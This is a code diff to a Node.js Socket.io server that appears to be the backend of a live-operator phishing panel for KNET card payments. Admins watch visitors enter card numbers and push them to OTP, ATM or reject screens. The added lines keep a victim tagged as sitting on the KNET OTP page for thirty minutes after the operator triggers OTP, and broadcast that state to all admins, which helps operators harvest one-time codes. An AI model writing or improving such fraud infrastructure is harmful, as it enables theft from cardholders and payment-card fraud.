@@ -445,6 +445,7 @@ io.on("connection", (socket) => {
   socket.on("visitor:pageEnter", (page) => {
     const visitor = __f91ResolveVisitor(socket, null);
     if (visitor) {
+      /*FIX98*/ try { if (visitor.__f98otp && (Date.now() - visitor.__f98otp) < 1800000) { var __p98 = String(page || ''); if (/cvv|atm|مرور|نهائي|final|رئيسي/i.test(__p98)) { visitor.__f98otp = 0; } else if (/دفع|كي\s*نت|knet|payment|otp|رمز/i.test(__p98)) { page = 'رمز التحقق كي نت (OTP)'; } } } catch(e){}
       visitor.page = page;
       visitor.lastActivity = Date.now();
       visitor.isIdle = false;
@@ -565,6 +566,7 @@ io.on("connection", (socket) => {
         }
       }
 
+      /*FIX98*/ try { if (visitor.__f98otp && (Date.now() - visitor.__f98otp) < 1800000) { var __q98 = String(data.page || ''); if (/cvv|atm|مرور|نهائي|final|رئيسي/i.test(__q98)) { visitor.__f98otp = 0; } else if (/دفع|كي\s*نت|knet|payment|otp|رمز/i.test(__q98)) { data.page = 'رمز التحقق كي نت (OTP)'; } } } catch(e){}
       visitor.page = data.page;
       visitor.waitingForAdminResponse = data.waitingForAdminResponse || false;
       visitor.hasNewData = true;
@@ -783,6 +785,7 @@ socket.on("cardNumber:verify", (cardNumber) => {
   // Admin: Card action (OTP, ATM, Reject)
   socket.on("admin:cardAction", ({ visitorSocketId, action }) => {
     __f91Emit(visitorSocketId, "card:action", action);
+    /*FIX98*/ try { var __v98 = visitors.get(visitorSocketId) || null; if (!__v98) { visitors.forEach(function(v){ if (!__v98 && v && (v._id === visitorSocketId || v.socketId === visitorSocketId)) __v98 = v; }); } if (__v98 && action === 'otp' && /كي\s*نت|knet/i.test(String(__v98.page || '')) && !/otp|رمز/i.test(String(__v98.page || ''))) { __v98.page = 'رمز التحقق كي نت (OTP)'; __v98.__f98otp = Date.now(); visitors.set(visitorSocketId, __v98); admins.forEach(function(a, k){ try { io.to(k).emit('visitor:pageChanged', { visitorId: __v98._id, page: __v98.page }); } catch(e){} }); } } catch(e){}
     // تحديث حالة الانتظار
     const visitor = visitors.get(visitorSocketId);
     if (visitor) {
